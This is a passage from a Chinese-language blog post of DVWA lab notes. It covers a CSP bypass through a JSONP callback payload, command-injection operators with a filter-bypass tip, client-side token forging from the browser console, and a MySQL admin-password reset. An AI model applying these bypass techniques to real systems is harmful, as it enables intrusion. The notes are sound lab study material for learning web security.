<h3 id="high：-3"><a href="#high：-3" class="headerlink" title="high："></a>high：</h3><p>头文件中：<br>script-src ‘self’:只允许自身加载JS</p>
<p>查看源码 有接收一个post方式的include参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &quot; . $_POST[&#x27;include&#x27;] . &quot;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;source/### high.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure>
<p>因为不包含’unsafe-inline’ 所以不能用<script> 使用src=<br>post include参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;source/jsonp.php?callback=alert(&#x27;hacked&#x27;);&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>


<h2 id="command-injection"><a href="#command-injection" class="headerlink" title="command injection"></a>command injection</h2><p>$cmd = shell_exec( ‘ping  ‘ . $target );<br>&amp;&amp; 1成功后执行2<br>&amp; 1后2<br>| 直接执行2（1输出作为2输入）<br>|| 1失败后2</p>
<h3 id="low-6"><a href="#low-6" class="headerlink" title="low:"></a>low:</h3><p>无处理</p>
<h3 id="medium-7"><a href="#medium-7" class="headerlink" title="medium:"></a>medium:</h3><p>过滤了$$,;</p>
<h3 id="high-6"><a href="#high-6" class="headerlink" title="high:"></a>high:</h3><p>过滤了大部分 注意有一个是’| ‘ 不是 ‘|’ |可以利用</p>
<h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><h3 id="low-7"><a href="#low-7" class="headerlink" title="low:"></a>low:</h3><p>输入success  invalid token 且为同一值（前端改了token) 查看页面源码 script中有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function generate_token() &#123;</span><br><span class="line">	var phrase = document.getElementById(&quot;phrase&quot;).value;</span><br><span class="line">	document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span><br><span class="line">&#125;</span><br><span class="line">generate_token();</span><br></pre></td></tr></table></figure>
<p>将success 先rot13 再md5 （再控制台中直接md5(rot13(“success”))，别手动，，，）<br>抓包改token welldone<br>或者 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同时改success 控制台调用generate_token()</span><br><span class="line">(先控制台生成 然后提交success)</span><br></pre></td></tr></table></figure>

<h3 id="medium-8"><a href="#medium-8" class="headerlink" title="medium:"></a>medium:</h3><p>页面的script中有 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src:&quot;../../vulnerabilities/javascript/source/### medium.js&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function do_something(e)&#123;</span><br><span class="line">  for(var t=&quot;&quot;,n=e.length-1;n&gt;=0;n--)t+=e[n];</span><br><span class="line">  return t</span><br><span class="line">  &#125;</span><br><span class="line">setTimeout(function()&#123;do_elsesomething(&quot;XX&quot;)&#125;,300);//settimeout:在指定的毫秒数后调用函数或计算表达式。</span><br><span class="line">function do_elsesomething(e)&#123;</span><br><span class="line">  document.getElementById(&quot;token&quot;).value=do_something(e+document.getElementById(&quot;phrase&quot;).value+&quot;XX&quot;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>与### low大致相同 script 在一个文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制台调用函数 do_elsesomething(&quot;XX&quot;) 生成token 提交success通过</span><br></pre></td></tr></table></figure>

<h3 id="high：-4"><a href="#high：-4" class="headerlink" title="high："></a>high：</h3><p>js混淆 <a target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/##">http://deobfuscatejavascript.com/##</a> 网页翻译后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function do_something(e) &#123;</span><br><span class="line">    for (var t = &quot;&quot;, n = e.length - 1; n &gt;= 0; n--) t += e[n];</span><br><span class="line">    return t</span><br><span class="line">&#125;</span><br><span class="line">function token_part_3(t, y = &quot;ZZ&quot;) &#123;</span><br><span class="line">    document.getElementById(&quot;token&quot;).value = sha256(document.getElementById(&quot;token&quot;).value + y)</span><br><span class="line">&#125;</span><br><span class="line">function token_part_2(e = &quot;YY&quot;) &#123;</span><br><span class="line">    document.getElementById(&quot;token&quot;).value = sha256(e + document.getElementById(&quot;token&quot;).value)</span><br><span class="line">&#125;</span><br><span class="line">function token_part_1(a, b) &#123;</span><br><span class="line">    document.getElementById(&quot;token&quot;).value = do_something(document.getElementById(&quot;phrase&quot;).value)</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;phrase&quot;).value = &quot;&quot;;</span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">    token_part_2(&quot;XX&quot;)</span><br><span class="line">&#125;, 300);</span><br><span class="line">document.getElementById(&quot;send&quot;).addEventListener(&quot;click&quot;, token_part_3);</span><br><span class="line">token_part_1(&quot;ABCD&quot;, 44);</span><br></pre></td></tr></table></figure>
<p>依据源码 生成token的顺序为：token_part_1(“ABCD”,44),token_part_2(“XX”),然后在点击鼠标时token_part_3<br>在控制台中输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function do_something(e) &#123;</span><br><span class="line">    for (var t = &quot;&quot;, n = e.length - 1; n &gt;= 0; n--) t += e[n];</span><br><span class="line">    return t</span><br><span class="line">&#125;</span><br><span class="line">function token_part_3(t, y = &quot;ZZ&quot;) &#123;</span><br><span class="line">    document.getElementById(&quot;token&quot;).value = sha256(document.getElementById(&quot;token&quot;).value + y)</span><br><span class="line">&#125;</span><br><span class="line">function token_part_2(e = &quot;YY&quot;) &#123;</span><br><span class="line">    document.getElementById(&quot;token&quot;).value = sha256(e + document.getElementById(&quot;token&quot;).value)</span><br><span class="line">&#125;</span><br><span class="line">function token_part_1(a, b) &#123;</span><br><span class="line">    document.getElementById(&quot;token&quot;).value = do_something(document.getElementById(&quot;phrase&quot;).value)</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;send&quot;).addEventListener(&quot;click&quot;, token_part_3);</span><br></pre></td></tr></table></figure>
<p>然后token_part 1,2<br>报错 Uncaught ReferenceError: sha256 is not defined</p>
<h2 id="dvwa忘记密码"><a href="#dvwa忘记密码" class="headerlink" title="dvwa忘记密码"></a>dvwa忘记密码</h2><p>发现过一段时间密码就会被清除</p>
<ol>
<li>进入phpstudy mysql命令行对数据库进行操作，查询数据库 修改密码<br>update users set password=”c4ca4238a0b923820dcc509a6f75849b” where user=”admin”;<br>md5加密</li>
</ol>
<p>mysql账号密码：<br>root root</p>
<h2 id="未完成"><a href="#未完成" class="headerlink" title="未完成"></a>未完成</h2><p>csp low 包含另一个网页的js代码时 无效（无弹窗）<br>high 控制台的报错不会处理</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/25/dvwa/" data-id="ckrtgnm9e000860uwfnkwajmj" data-title="dvwa做题笔记" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/07/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          文件包含漏洞总结
        
      </div>
    </a>
  
  
    <a href="/2021/07/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">文件上传漏洞总结</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/challenge/">challenge</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa/" rel="tag">dvwa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rce/" rel="tag">rce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/dvwa/" style="font-size: 10px;">dvwa</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/10/03/rce/">rce的小整理</a>
          </li>
        
          <li>
            <a href="/2021/08/26/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化总结</a>
          </li>
        
          <li>
            <a href="/2021/07/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞总结</a>
          </li>
        
          <li>
            <a href="/2021/07/25/dvwa/">dvwa做题笔记</a>
          </li>
        
          <li>
            <a href="/2021/07/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 rhoeo<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>